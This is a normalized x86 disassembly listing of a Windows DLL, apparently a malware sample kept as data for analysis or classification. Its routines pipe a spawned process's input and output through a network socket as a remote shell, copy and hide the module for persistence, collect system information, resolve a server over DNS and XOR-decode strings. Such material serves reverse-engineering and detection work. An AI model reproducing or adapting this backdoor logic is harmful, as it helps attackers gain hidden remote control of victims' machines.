sub_10001016
push ebp
lea ebp [ esp - 0x2d318 ]
mov eax 0x2d398
call sub_1001ac50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2d314 ] eax
push ebx
push esi
mov esi [ ebp + 0x2d320 ]
mov eax [ esi ]
push edi
push 0x20a
mov [ ebp - 0xc ] eax
xor ebx ebx
lea eax [ ebp + 0x2d000 ]
push ebx
push eax
mov [ ebp - 0x20 ] esi
call sub_1000b660
mov edi [ CreatePipe@IAT ]
add esp 0xc
push ebx
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x3c ] 0xc
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] 0x1
call edi
test eax eax
je r-xdata
call sub_1001265d
push [ ebp - 0xc ]
call [ closesocket@IAT ]
push esi
call sub_1000b6da
pop ecx
mov ecx [ ebp + 0x2d314 ]
pop edi
xor eax eax
pop esi
xor ecx ebp
inc eax
pop ebx
call sub_1000ac69
add ebp 0x2d318
leave
retn
push ebx
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call edi
test eax eax
je r-xdata
mov edi [ CloseHandle@IAT ]
xor eax eax
mov [ ebp - 0x30 ] ebx
lea edi [ ebp - 0x2c ]
stosd [ edi ]
stosd [ edi ]
push 0x40
stosd [ edi ]
lea eax [ ebp - 0x7c ]
push ebx
push eax
mov [ ebp - 0x80 ] ebx
call sub_1000b660
add esp 0xc
lea eax [ ebp - 0x80 ]
push eax
call [ GetStartupInfoW@IAT ]
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x44 ] eax
xor eax eax
mov [ ebp - 0x50 ] ax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
push ebx
push ebx
push ebx
push 0x1
push ebx
push ebx
lea eax [ esi + 0x4 ]
push eax
push ebx
mov [ ebp - 0x54 ] 0x101
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
mov edi [ CloseHandle@IAT ]
mov esi [ Sleep@IAT ]
push 0x64
call esi
push 0x5
call esi
mov edi 0xf000
jmp r-xdata
call sub_1001265d
push [ ebp - 0x8 ]
call edi
push [ ebp - 0x14 ]
call edi
push ebx
push ebx
lea eax [ ebp - 0x4 ]
push eax
push edi
lea eax [ ebp ]
push eax
push [ ebp - 0x8 ]
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
push ebx
push [ ebp - 0x30 ]
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
call sub_1001265d
push [ ebp - 0x2c ]
mov edi [ CloseHandle@IAT ]
call edi
push ebx
push [ ebp - 0x30 ]
call [ TerminateProcess@IAT ]
push [ ebp - 0x30 ]
call edi
mov esi [ ebp - 0x20 ]
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
call sub_1001265d
push [ ebp - 0x1c ]
call edi
push [ ebp - 0x10 ]
call edi
jmp r-xdata
mov ecx [ ebp - 0xc ]
xor eax eax
call sub_10006d56
cmp eax ebx
jle r-xdata
push ebx
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x4 ]
lea eax [ ebp ]
push eax
push [ ebp - 0x8 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
jl r-xdata
push ebx
push 0x20a
lea eax [ ebp + 0x2d000 ]
push eax
push [ ebp - 0xc ]
call [ recv@IAT ]
mov [ ebp - 0x18 ] eax
cmp eax ebx
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp + eax ] bl
push 0x1
lea eax [ ebp ]
push eax
push edi
lea ebx [ ebp + 0xf000 ]
call sub_10008171
mov eax [ ebp - 0x4 ]
mov ecx ebx
push ecx
push [ ebp - 0xc ]
add eax eax
call sub_10006dde
mov ecx [ ebp - 0x4 ]
add ecx ecx
add esp 0x14
xor ebx ebx
cmp eax ecx
jne r-xdata
push 0x5
call esi
push 0x1
lea eax [ ebp + 0x2d000 ]
push eax
lea eax [ ebp + 0x2d20c ]
push 0x104
push eax
call sub_10008113
add esp 0x10
push ebx
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x18 ]
shr eax 0x1
push eax
lea eax [ ebp + 0x2d20c ]
push eax
push [ ebp - 0x10 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
sub_1000129b
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0x4 ]
call [ CommandLineToArgvW@IAT ]
mov esi [ esi ]
push 0x5
push esi
mov [ ebp - 0x8 ] eax
call sub_1000442e
mov ebx eax
pop ecx
pop ecx
test ebx ebx
jne r-xdata
push edi
mov esi 0x20c
push esi
call sub_1000b786
push esi
mov edi eax
push 0x0
push edi
call sub_1000b660
add esp 0x10
mov [ edi ] ebx
cmp [ ebp - 0x4 ] 0x2
push 0x104
jge r-xdata
push r--data
push esi
call sub_10006e8e
pop ecx
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
push [ eax + 0x4 ]
push r--data
jmp r-xdata
pop esi
xor eax eax
pop ebx
leave
retn
lea eax [ edi + 0x4 ]
push eax
call sub_1000b3a3
add esp 0xc
push edi
push sub_10001016
call sub_1000714d
pop ecx
pop ecx
pop edi
sub_10001329
push ebp
mov ebp esp
sub esp 0x61c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x104
lea eax [ ebp - 0x20c ]
push eax
call [ GetSystemDirectoryW@IAT ]
push r--data
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ LoadLibraryW@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000ac69
leave
retn
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x61c ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
push 0x10
push r--data
lea eax [ ebp - 0x61c ]
push eax
push 0x0
call [ MessageBoxW@IAT ]
mov eax [ rw-data ]
sub_100013c7
push ebp
mov ebp esp
sub esp 0x21c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push esi
push [ rw-data ]
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn
mov eax esi
shr eax 0x10
test ax ax
jne r-xdata
push esi
lea eax [ ebp - 0x21c ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
push 0x10
push r--data
lea eax [ ebp - 0x21c ]
push eax
push 0x0
call [ MessageBoxW@IAT ]
push 0xfffffffe
call [ ExitProcess@IAT ]
push esi
lea eax [ ebp - 0x14 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea esi [ ebp - 0x14 ]
sub_100030ab
cmp [ esp + 0x8 ] 0x1
push esi
jne r-xdata
xor esi esi
cmp [ esp + 0xc ] esi
jne r-xdata
push edi
push [ esp + 0xc ]
call [ DisableThreadLibraryCalls@IAT ]
call sub_10001329
mov esi 0x208
push esi
call sub_1000ac5e
push esi
xor esi esi
mov edi eax
push esi
push edi
call sub_1000b660
add esp 0x10
push 0x104
push edi
push [ esp + 0x14 ]
call [ GetModuleFileNameW@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop esi
retn 0xc
mov eax [ rw-data ]
cmp eax esi
je r-xdata
pop edi
jmp r-xdata
push esi
push esi
push edi
push sub_1000ab60
push esi
push esi
call [ CreateThread@IAT ]
cmp eax esi
je r-xdata
push eax
call [ FreeLibrary@IAT ]
push eax
call [ CloseHandle@IAT ]
sub_1000312e
push ebp
lea ebp [ esp - 0xc4 ]
sub esp 0x144
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xc0 ] eax
push ebx
push esi
push edi
mov esi ecx
mov edi rw-data
push edi
mov [ rw-data ] esi
call [ EnterCriticalSection@IAT ]
push r--data
push rw-data
call sub_1000b34d
pop ecx
pop ecx
push edi
call [ LeaveCriticalSection@IAT ]
push 0x104
push rw-data
call [ GetSystemDirectoryW@IAT ]
mov edi 0x208
push edi
mov ebx rw-data
push ebx
push esi
mov esi [ GetModuleFileNameW@IAT ]
call esi
push edi
mov edi rw-data
push edi
push 0x0
call esi
push ebx
call sub_1001265d
push edi
call sub_1001265d
mov esi 0x11c
push esi
lea eax [ ebp - 0x5c ]
push 0x0
push eax
call sub_1000b660
add esp 0x14
lea eax [ ebp - 0x5c ]
push eax
mov [ ebp - 0x5c ] esi
call [ GetVersionExW@IAT ]
pop edi
pop esi
pop ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x58 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x54 ]
push 0x24
mov [ rw-data ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_1000b660
add esp 0xc
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call sub_1001265d
jmp r-xdata
lea eax [ ebp - 0x80 ]
push eax
call [ GetSystemInfo@IAT ]
lea ecx [ ebp - 0x80 ]
push ecx
call eax
jmp r-xdata
mov ecx [ ebp + 0xc0 ]
xor ecx ebp
call sub_1000ac69
add ebp 0xc4
leave
retn
mov ax [ ebp - 0x80 ]
mov [ rw-data ] ax
movzx eax ax
push eax
push [ rw-data ]
push [ rw-data ]
call sub_1001265d
add esp 0xc
sub_10003267
push ebp
mov ebp esp
sub esp 0x480
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x420 ] eax
xor eax eax
mov ebx 0x206
push ebx
mov [ ebp - 0x41c ] ax
xor esi esi
lea eax [ ebp - 0x41a ]
push esi
push eax
call sub_1000b660
lea eax [ ebp - 0x41c ]
push eax
call sub_1000861c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
lea eax [ ebp - 0x41c ]
push r--data
push eax
call sub_1000b5f8
mov edi eax
xor eax eax
push ebx
mov [ ebp - 0x214 ] ax
lea eax [ ebp - 0x212 ]
push esi
push eax
call sub_1000b660
lea eax [ ebp - 0x41c ]
sub edi eax
sar edi 0x1
add edi edi
push edi
push eax
lea eax [ ebp - 0x214 ]
push eax
call sub_1000ac80
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_1000b31f
add esp 0x28
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x41c ]
push eax
call [ MoveFileW@IAT ]
lea eax [ ebp - 0x214 ]
push eax
call sub_1001265d
push [ ebp - 0x420 ]
call sub_1001265d
push 0x10
lea eax [ ebp - 0x430 ]
push esi
push eax
call sub_1000b660
push 0x44
pop edi
push edi
lea eax [ ebp - 0x47c ]
push esi
push eax
call sub_1000b660
push edi
lea eax [ ebp - 0x47c ]
push esi
push eax
call sub_1000b660
add esp 0x2c
xor eax eax
mov [ ebp - 0x44c ] ax
mov [ ebp - 0x44a ] ax
lea eax [ ebp - 0x430 ]
push eax
lea eax [ ebp - 0x47c ]
push eax
push esi
push esi
push 0x10
push 0x1
push esi
push esi
push [ ebp - 0x420 ]
lea eax [ ebp - 0x214 ]
push eax
mov [ ebp - 0x47c ] edi
mov [ ebp - 0x450 ] 0x101
mov [ ebp - 0x478 ] esi
mov [ ebp - 0x448 ] esi
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
call sub_1001265d
call sub_10007176
lea eax [ ebp - 0x214 ]
push eax
call [ DeleteFileW@IAT ]
push 0xffffffff
push [ ebp - 0x430 ]
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x42c ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0x430 ]
call esi
lea eax [ ebp - 0x214 ]
push eax
call [ DeleteFileW@IAT ]
call sub_1001265d
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
sub_1000342b
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1ac
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1a8 ] eax
push ebx
push esi
push edi
mov esi r--data
push esi
mov ebx rw-data
push ebx
call sub_1000b17d
pop ecx
pop ecx
test eax eax
jne r-xdata
mov edi r--data
call sub_10007215
lea eax [ esp + 0x10 ]
push esi
push eax
call sub_1000840b
pop ecx
pop ecx
test al al
jne r-xdata
call sub_1001265d
fld [ esp + 0x14 ]
sub esp 0x10
fld [ rw-data ]
fcom st1
fnstsw ax
fstp st1
fstp [ esp + 0x8 ]
fld [ esp + 0x24 ]
fstp [ esp ]
call sub_1001265d
add esp 0x10
test ah 0x41
jne r-xdata
call sub_1001265d
jmp r-xdata
xor eax eax
inc eax
mov edi esi
call sub_10007215
test al al
jne r-xdata
push 0x0
push esi
push ebx
call [ CopyFileW@IAT ]
push esi
push r--data
call sub_10008338
pop ecx
pop ecx
push 0x7
push esi
mov esi [ SetFileAttributesW@IAT ]
call esi
push 0x7
push ebx
call esi
xor eax eax
jmp r-xdata
push 0x1
push r--data
push esi
call [ MoveFileExW@IAT ]
mov ecx [ esp + 0x1b4 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000ac69
mov esp ebp
pop ebp
retn
sub_10003510
push ebp
mov ebp esp
mov eax 0x1e68
call sub_1001ac50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x1e40 ] eax
xor eax eax
push 0x7fe
mov [ ebp - 0x1e34 ] ax
xor ebx ebx
lea eax [ ebp - 0x1e32 ]
push ebx
push eax
call sub_1000b660
push 0x3ff
lea eax [ ebp - 0xe33 ]
push ebx
push eax
mov [ ebp - 0xe34 ] bl
call sub_1000b660
mov edi 0x800
push edi
lea eax [ ebp - 0x1634 ]
push ebx
push eax
call sub_1000b660
push edi
lea eax [ ebp - 0x82c ]
push ebx
push eax
call sub_1000b660
add esp 0x30
mov esi 0x400
push esi
lea eax [ ebp - 0xe34 ]
push eax
call [ gethostname@IAT ]
test eax eax
je r-xdata
push ebx
lea eax [ ebp - 0xe34 ]
push eax
push esi
lea ebx [ ebp - 0x1e34 ]
call sub_10008171
push eax
lea eax [ ebp - 0x82c ]
push eax
call sub_1000b34d
push 0x0
lea eax [ ebp - 0x82c ]
push eax
lea eax [ ebp - 0xe34 ]
push esi
push eax
call sub_10008113
add esp 0x24
push eax
call [ gethostbyname@IAT ]
mov [ ebp - 0x1e3c ] eax
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ RegOpenKeyW@IAT ]
lea eax [ ebp - 0x1e38 ]
push eax
push r--data
push 0x80000002
call ebx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
mov edi r--data
lea eax [ ebp - 0x82c ]
push edi
push eax
call sub_1000b31f
lea eax [ ebp - 0x1634 ]
push eax
lea eax [ ebp - 0x82c ]
push eax
call sub_1000b31f
lea eax [ ebp - 0x82c ]
push r--data
push eax
call sub_1000b31f
add esp 0x18
lea eax [ ebp - 0x1e38 ]
push eax
push r--data
push 0x80000002
call ebx
test eax eax
jne r-xdata
push edi
lea eax [ ebp - 0x1634 ]
push eax
push r--data
lea esi [ ebp - 0x1e38 ]
call sub_10007311
add esp 0xc
lea eax [ ebp - 0x1634 ]
push eax
lea eax [ ebp - 0x82c ]
push eax
call sub_1000b31f
pop ecx
pop ecx
lea eax [ ebp - 0x1e48 ]
xor ebx ebx
push eax
mov [ ebp - 0x1e48 ] ebx
call [ GetCurrentProcessId@IAT ]
push eax
call [ ProcessIdToSessionId@IAT ]
xor eax eax
push 0x206
mov [ ebp - 0xa34 ] ax
lea eax [ ebp - 0xa32 ]
push ebx
push eax
call sub_1000b660
push [ ebp - 0x1e48 ]
lea eax [ ebp - 0xa34 ]
push r--data
push eax
call sub_10001000
lea eax [ ebp - 0x82c ]
push edi
push eax
call sub_1000b31f
lea eax [ ebp - 0xa34 ]
push eax
lea eax [ ebp - 0x82c ]
push eax
call sub_1000b31f
push r--data
mov esi rw-data
push esi
call sub_1000b6e5
add esp 0x30
test eax eax
push edi
lea eax [ ebp - 0x82c ]
push eax
je r-xdata
push 0x800
lea eax [ ebp - 0x1634 ]
push eax
push r--data
lea esi [ ebp - 0x1e38 ]
call sub_10007311
add esp 0xc
call sub_1000b31f
push rw-data
call sub_1000b31f
push esi
jmp r-xdata
lea esi [ ebp - 0x1634 ]
call sub_10007457
mov edi [ ebp - 0x1e40 ]
mov eax esi
push eax
lea eax [ ebp - 0x82c ]
push eax
push r--data
push edi
call sub_10001000
mov ebx eax
lea eax [ edi + ebx * 2 ]
push r--data
push eax
call sub_10001000
and [ ebp - 0x1e3c ] 0x0
add esp 0x18
add ebx eax
and [ ebp - 0x1e44 ] 0x0
lea eax [ ebp - 0x82c ]
push edi
push eax
call sub_1000b31f
xor eax eax
cmp ax [ ebx + 0xa ]
pop ecx
pop ecx
jge r-xdata
lea eax [ ebp - 0x82c ]
push eax
call sub_1000b31f
add esp 0x10
mov [ ebp - 0x1e38 ] ebx
xor eax eax
push 0x4
lea eax [ ebp - 0x1e44 ]
push eax
push r--data
lea esi [ ebp - 0x1e40 ]
call sub_10007311
add esp 0xc
jmp r-xdata
add [ ebp - 0x1e38 ] 0x4
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x1e68 ]
push eax
mov [ ebp - 0x1e68 ] 0x20
call [ GlobalMemoryStatus@IAT ]
mov eax [ ebp - 0x1e60 ]
shr eax 0x14
push eax
lea eax [ edi + ebx * 2 ]
push r--data
push eax
call sub_10001000
add ebx eax
lea eax [ edi + ebx * 2 ]
push r--data
push eax
call sub_10001000
add ebx eax
push rw-data
lea eax [ edi + ebx * 2 ]
push r--data
push eax
call sub_10001000
xor eax eax
add esp 0x20
inc eax
push [ ebp - 0x1e44 ]
lea eax [ edi + ebx * 2 ]
push r--data
push eax
call sub_10001000
add esp 0xc
add ebx eax
jmp r-xdata
test eax eax
je r-xdata
mov ebx [ ebp - 0x1e3c ]
mov eax [ ebx + 0xc ]
mov ecx [ ebp - 0x1e38 ]
xor esi esi
cmp [ ecx + eax ] esi
je r-xdata
test esi esi
jle r-xdata
push [ ebp - 0x1e3c ]
lea eax [ ebp - 0x1e34 ]
push r--data
push eax
call sub_10001000
add esp 0xc
inc [ ebp - 0x1e3c ]
lea eax [ ebp - 0x1e40 ]
push eax
lea eax [ ebp - 0x1e34 ]
push eax
push 0x80000002
call [ RegOpenKeyW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0xc ]
mov ecx [ ebp - 0x1e38 ]
mov eax [ eax + ecx ]
movzx eax [ eax + esi ]
push eax
lea eax [ ebp - 0x28 ]
push r--data
push eax
call sub_1000b210
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x400
lea ebx [ ebp - 0x1e34 ]
call sub_10008171
push eax
lea eax [ ebp - 0x82c ]
push eax
call sub_1000b31f
mov eax [ ebp - 0x1e3c ]
movsx eax [ eax + 0xa ]
add esp 0x20
inc esi
cmp esi eax
jl r-xdata
lea eax [ ebp - 0x82c ]
push r--data
push eax
call sub_1000b31f
pop ecx
pop ecx
mov ebx [ ebp - 0x1e3c ]
sub_10003943
push esi
xor esi esi
push eax
push rw-data
call sub_1000b34d
pop ecx
pop ecx
xor eax eax
inc eax
pop esi
retn
inc esi
cmp esi 0x3
jl r-xdata
mov eax [ esp + 0x8 ]
xor edx edx
push 0x3
pop ecx
div ecx
shl edx 0x6
add edx rw-data
push edx
call sub_10006d0c
inc [ esp + 0xc ]
pop ecx
test eax eax
jne r-xdata
pop esi
retn
sub_10003983
push ebp
lea ebp [ esp - 0xb94 ]
sub esp 0xc14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xb90 ] eax
mov eax [ ebp + 0xb9c ]
push ebx
push esi
push edi
xor edi edi
push edi
push rw-data
mov [ ebp - 0x78 ] eax
mov esi 0x400
lea eax [ ebp - 0x70 ]
push esi
push eax
mov ebx ecx
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x80 ] 0x1
call sub_10008113
add esp 0x10
push eax
call [ inet_addr@IAT ]
push edi
mov [ ebp - 0x7c ] eax
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
push edi
push 0x1
push ebx
call DnsQuery_W
test eax eax
je r-xdata
mov eax [ ebp - 0x74 ]
push [ eax + 0x18 ]
call [ inet_ntoa@IAT ]
cmp eax edi
je r-xdata
xor al al
jmp r-xdata
xor esi esi
push edi
push eax
push esi
lea ebx [ ebp + 0x390 ]
call sub_10008171
push eax
push [ ebp - 0x78 ]
call sub_1000b34d
xor esi esi
add esp 0x14
inc esi
jmp r-xdata
mov ecx [ ebp + 0xb90 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
add ebp 0xb94
leave
retn
push 0x1
push [ ebp - 0x74 ]
call DnsFree
cmp esi edi
setne al
sub_10003a4c
push 0xbb4
push r--data
call sub_1001cf0c
push 0x2710
mov edi [ Sleep@IAT ]
call edi
mov eax rw-data
push eax
call sub_1001265d
add esp 0x4
push eax
push rw-data
call sub_1000840b
pop ecx
pop ecx
test al al
jne r-xdata
call sub_1001265d
call sub_1000342b
call sub_1000a4a4
call sub_1000725b
test eax eax
jne r-xdata
xor eax eax
call sub_1001265d
lea eax [ ebp - 0xbb8 ]
push eax
push 0x202
call [ WSAStartup@IAT ]
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
call sub_1001265d
and [ ebp - 0xbbc ] eax
mov [ rw-data ] 0x1
mov esi rw-data
cmp [ rw-data ] eax
jne r-xdata
call sub_1001265d
jmp sub_10003d6c
call sub_100071b8
xor ecx ecx
test al al
sete cl
mov [ ebp - 0xbc0 ] ecx
and [ ebp - 0x4 ] 0x0
mov ebx 0x3e8
push 0x63
pop edx
mov eax esi
mov ecx 0x2619
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001265d
call [ WSACleanup@IAT ]
jmp sub_10003d6c
cmp [ ebp - 0xbc0 ] 0x1
jne r-xdata
dec edx
mov ebx ecx
xor [ eax ] bx
inc eax
inc eax
test edx edx
jne r-xdata
push 0x63
pop edx
mov eax rw-data
cmp [ ebp - 0xbc0 ] 0x0
jne r-xdata
mov eax [ ebp - 0xbbc ]
inc [ ebp - 0xbbc ]
push eax
call sub_10003943
pop ecx
test eax eax
jne r-xdata
dec edx
mov ebx ecx
xor [ eax ] bx
inc eax
inc eax
test edx edx
jne r-xdata
mov [ rw-data ] 0x1
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
push esi
call sub_1001265d
movzx eax [ rw-data ]
push eax
push esi
call sub_10006bf2
add esp 0x10
push esi
call sub_1001265d
add esp 0x4
lea eax [ ebp - 0x228 ]
push eax
mov ecx esi
call sub_10003983
pop ecx
test al al
je r-xdata
push ebx
call edi
call [ GetLastError@IAT ]
push ebx
call edi
push [ rw-data ]
push esi
call sub_1001265d
add esp 0x8
jmp r-xdata
test eax eax
je r-xdata
call sub_1001265d
push esi
call sub_1001265d
add esp 0x4
push esi
call sub_10006d0c
pop ecx
mov [ ebp - 0xbc4 ] eax
test eax eax
je r-xdata
lea eax [ ebp - 0x228 ]
push eax
call sub_1001265d
mov [ esp ] r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xa28 ] ax
push 0x7fe
push eax
lea eax [ ebp - 0xa26 ]
push eax
call sub_1000b660
add esp 0xc
lea eax [ ebp - 0xa28 ]
push eax
call sub_10003510
pop ecx
test eax eax
jne r-xdata
call sub_1001265d
push ebx
call edi
jmp r-xdata
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
je r-xdata
movzx eax [ rw-data ]
push eax
lea eax [ ebp - 0x228 ]
push eax
call sub_10006bf2
pop ecx
pop ecx
jmp r-xdata
push 0x1
push 0x0
push [ rw-data ]
push 0x0
call sub_10003d74
add esp 0x10
test eax eax
jne r-xdata
push [ rw-data ]
call sub_10006b18
pop ecx
push ebx
push [ ebp - 0xbc4 ]
lea eax [ ebp - 0x228 ]
push eax
call sub_1000b34d
lea eax [ ebp - 0x228 ]
push eax
call sub_1001265d
add esp 0xc
jmp r-xdata
mov [ rw-data ] eax
lea eax [ ebp - 0xa28 ]
push eax
call sub_1000b3ed
pop ecx
add eax eax
lea ecx [ ebp - 0xa28 ]
push ecx
push [ rw-data ]
call sub_10006dde
pop ecx
pop ecx
call sub_10006e59
call sub_100044de
push [ rw-data ]
call edi
call sub_1001265d
jmp r-xdata
push 0x7d0
call edi
push [ rw-data ]
call sub_10006b18
mov [ esp ] 0x7d0
jmp r-xdata
call edi
call sub_1001265d
jmp r-xdata
sub_10003d74
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x10
pop ebx
push ebx
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_1000b660
push ebx
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_1000b660
mov esi [ ebp + 0xc ]
push 0x7
lea eax [ ebp - 0x14 ]
push eax
push esi
mov edi ebx
call sub_10006d97
add esp 0x24
test eax eax
jle r-xdata
call sub_1001265d
xor eax eax
mov edi 0x2619
cmp [ ebp - 0x14 ] edi
jne r-xdata
mov eax 0x6781
cmp [ ebp - 0x10 ] eax
jne r-xdata
fld [ ebp - 0xc ]
mov cl [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
fstp [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
fld [ rw-data ]
mov [ ebp - 0x8 ] eax
fstp [ ebp - 0xc ]
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax ebx
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x18 ] cl
mov [ ebp - 0x14 ] edi
call sub_10006dde
push 0x1e
lea eax [ ebp - 0x14 ]
push eax
push esi
mov edi ebx
call sub_10006d97
add esp 0x14
test eax eax
jle r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_1001265d
mov eax [ ebp - 0x10 ]
push ebx
mov [ ebp - 0x20 ] eax
xor edi edi
lea eax [ ebp - 0x14 ]
push edi
push eax
call sub_1000b660
add esp 0xc
mov [ ebp - 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
mov eax [ rw-data ]
cmp [ ebp - 0x14 ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_10006a43
mov [ ebp - 0x10 ] eax
lea esi [ ebp - 0x24 ]
lea edi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push rw-data
movsd [ edi ] [ esi ]
call [ EnterCriticalSection@IAT ]
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_10006a8a
push rw-data
call [ LeaveCriticalSection@IAT ]
mov esi [ ebp + 0xc ]
jmp r-xdata
cmp eax 0x4093df4e
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax ebx
call sub_10006dde
pop ecx
xor eax eax
pop ecx
inc eax
jmp r-xdata
push ebx
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_1000b660
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax ebx
mov [ ebp - 0x14 ] 0x1
call sub_10006dde
add esp 0x14
sub_10003ee4
push edi
xor edi edi
cmp [ esp + 0xc ] edi
jle r-xdata
xor eax eax
pop edi
retn
mov ecx [ esp + 0x8 ]
or eax 0xffffffff
call sub_10006d56
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
push 0x0
push 0x2
lea eax [ edi + esi ]
push eax
push [ esp + 0x14 ]
call [ recv@IAT ]
test eax eax
jle r-xdata
add edi eax
mov eax edi
cdq
sub eax edx
sar eax 0x1
xor ecx ecx
mov [ esi + eax * 2 ] cx
cmp edi 0x2
jne r-xdata
cmp edi 0x4
jl r-xdata
cmp [ esi ] 0xa
je r-xdata
cmp edi [ esp + 0xc ]
jl r-xdata
mov eax edi
cdq
sub eax edx
sar eax 0x1
cmp [ esi + eax * 2 - 0x2 ] 0xa
je r-xdata
xor eax eax
mov [ esi ] ax
mov eax edi
cdq
sub eax edx
sar eax 0x1
xor ecx ecx
mov [ esi + eax * 2 - 0x2 ] cx
lea eax [ esi + eax * 2 - 0x4 ]
cmp [ eax ] 0xd
jne r-xdata
xor eax eax
inc eax
pop edi
retn
mov [ eax ] cx
jmp r-xdata
sub_10003f77
push esi
push edi
push [ esp + 0xc ]
call sub_1000442e
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push 0x1388
push 0x7530
push esi
call sub_10006eea
add esp 0xc
cmp edi 0x1
jne r-xdata
push r--data
push [ esp + 0xc ]
call sub_10006e8e
pop ecx
pop ecx
xor eax eax
pop esi
retn
